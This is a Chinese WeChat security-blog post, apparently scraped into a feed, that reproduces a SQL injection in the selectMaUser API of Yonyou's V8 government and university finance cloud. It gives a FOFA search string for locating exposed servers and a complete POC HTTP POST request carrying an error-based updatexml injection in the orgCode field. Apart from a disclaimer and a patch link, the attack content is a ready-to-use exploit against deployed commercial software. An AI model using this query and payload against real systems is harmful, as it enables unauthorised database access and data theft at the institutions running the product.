---
title: 【漏洞复现】用友A++V8系列产品selectMaUser接口SQL注入漏洞
url: https://mp.weixin.qq.com/s/bPDCLx_y_ecRahm1p5XKSw
source: Doonsec's feed
date: 2026-07-22
fetch_date: 2026-07-23T05:07:11.392305
---

# 【漏洞复现】用友A++V8系列产品selectMaUser接口SQL注入漏洞

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/oXVNrHPdp9bVZCtc7fkloAFsMFT6mkBCExloicrVG1IJcpO5WIR87dXzDJlZAtOlPcFRlY52SPv4cicrmlDQyTicv94BOCrsaTiclZBYKmRvFzQ/0?wx_fmt=jpeg)

# 【漏洞复现】用友A++V8系列产品selectMaUser接口SQL注入漏洞

PokerSec
PokerSec

PokerSec

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

**「先关注，不迷路」**

## 免责声明

请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。

## 漏洞介绍

用友政务财务云V8产品定位“享、智、控”理念，享为信息数据的共享、智为智能智慧的运用、控为全面全程的管控。该产品为满足高校行业特性，打造了包含智能收费、场景化缴费服务、智能报销、高校预算管理，其他薪资收入等模块的智慧服务型高校财务共享平台。财务云V8系统/ma/api/selectMaUser接口存在SQL注入漏洞，攻击者可通过orgCode参数构造恶意SQL语句，利用UPDATEXML函数触发数据库错误，获取数据库敏感信息。

## 影响版本

用友政务财务云V8产品官方在售及提供服务器的版本(8.31、8.32、8.33)。

## fofa

app="用友-政务财务系统"||body="/df/portal/getYearRgcode.do"

## 漏洞复现

![](https://mmbiz.qpic.cn/mmbiz_png/oXVNrHPdp9a95ondajPgDicXr8JBAdicoMttJhHDQqLFZwibZC8uXiciaXp2GxwluvaJJ9QJGtc53vgmHehMnmspLW64zHYrcF6G6jpbgZ4tuCU8/640?wx_fmt=png&from=appmsg)

POC:

(这微信页面直接复制代码格式会乱，可以浏览器打开复制)

```
POST /ma/api/selectMaUser HTTP/1.1
Host: xxxx
X-Requested-With: XMLHttpRequest
Accept-Language: zh-CN,zh;q=0.9
Accept: */*
User-Agent: Mozilla/5.0 (Intel Mac OS X 13_12_1) AppleWebKit/527.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/json
Content-Length: 86

{"orgCode":"1' AND (updatexml(1,concat(0x7e,(select database()),0x7e),1)) AND '1'='1"}
```

![](https://mmbiz.qpic.cn/mmbiz_png/oXVNrHPdp9Y41WWQWdtibxqGqAltajHiar9PQf9FfXNKhr2ibMyKxAcj5c7rqlGXBj28K2DCCscwG26hlQbdBIvlC7fGJfGRl7vfcXqI5icBNZE/640?wx_fmt=png&from=appmsg)

## 修复意见

及时更新官方补丁：https://security.yonyou.com/#/patchInfo?identifier=309233a5451d4d349c3bc47937fd4f4e

如有侵权，请及时联系删除。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/Ej4eNleprJLiarKC5mIogwl7Px5Zh8gVkOA7yaxo8EP7Wqo97FiarWicPfTRt7s9tD8Ks3ghLDaYzqFVhLbHgJIRQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过